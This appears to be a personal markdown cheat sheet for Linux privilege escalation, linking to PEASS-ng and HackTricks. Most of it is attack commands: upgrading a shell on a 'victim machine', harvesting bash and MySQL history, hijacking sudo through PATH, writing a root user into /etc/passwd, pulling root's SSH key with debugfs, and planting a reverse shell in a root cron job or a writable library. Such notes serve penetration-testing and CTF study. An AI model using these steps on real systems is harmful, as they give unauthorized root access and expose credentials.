Always good to run [PEASS-NG](https://github.com/carlospolop/PEASS-ng)

For a detailed guide go to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

# Linux Privilege escalation

- [Linux Privilege escalation](#linux-privilege-escalation)
- [Upgrade shell - Linux](#upgrade-shell---linux)
- [General info](#general-info)
- [Abusing sudo](#abusing-sudo)
    - [Can sudo but absolute path specified](#can-sudo-but-absolute-path-specified)
    - [Can sudo, absoulte path NOT specified?](#can-sudo-absoulte-path-not-specified)
- [Weak file permissions](#weak-file-permissions)
    - [Writable `/etc/passwd`](#writable-etcpasswd)
    - [`/dev/sda1` readable?](#devsda1-readable)
- [Abusing CRON jobs](#abusing-cron-jobs)
    - [Writable libraries](#writable-libraries)

# Upgrade shell - Linux

```bash
# On victim machine
which python3
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background listener uzing Ctrl+z
stty -a # Notice number of rows and cols
stty raw -echo; fg

# On victim again
stty rows xx
stty cols yyy
export TERM=xterm-256color
```

# General info

```bash
# username, groups
id
groups

# Part of too many groups? Find out all the files you've access to
for i in $(groups); do echo "[+] $i ============="; find / -group $i 2>/dev/null | grep -v "proc" >> allfiles; done

# Interesting internally listening ports?
netstat -anpt

# Look what the user was up to 
less .bash_history
less mysql_history

# Check user accounts
cat /etc/passwd | grep "sh$\|python"
```

# Abusing sudo

```bash
sudo -l # Check programs on GTFOBins
```
## Can sudo but absolute path specified

```bash
# View libraries being loaded by these programs and check if absolute path is specified or not (e.g. `LD_PRELOAD`)
sudo ltrace /path/to/program
```

## Can sudo, absoulte path NOT specified?

```bash
echo "/bin/sh" > <program_name> chmod 777 <program_name>
export PATH=.:$PATH
sudo <program_name>
```

# Weak file permissions

## Writable `/etc/passwd`
```bash
# Remove 'x' beside a username --> no password

# Create a new user
openssl passwd "anypwd" # Prints out a hash
# Make a new entry at the end of /etc/passwd
yourusername:$passwd_hash:0:0:/root:/bin/bash # Become r00t yourself
```

## `/dev/sda1` readable?

```bash
debugfs /dev/sda1 # Get root's SSH private key
```

# Abusing CRON jobs

```bash
ls -l /etc/cron.d/ # Check permissions

# Writable CRON program?
vi /etc/cron.d/custom_cronjob

# Insert language specific reverse shell
# E.g. add following line:
* * * * * root /usr/bin/python3 /path/to/reverse_shell.py
```

## Writable libraries

Insert language specific reverse shell at the end of the library
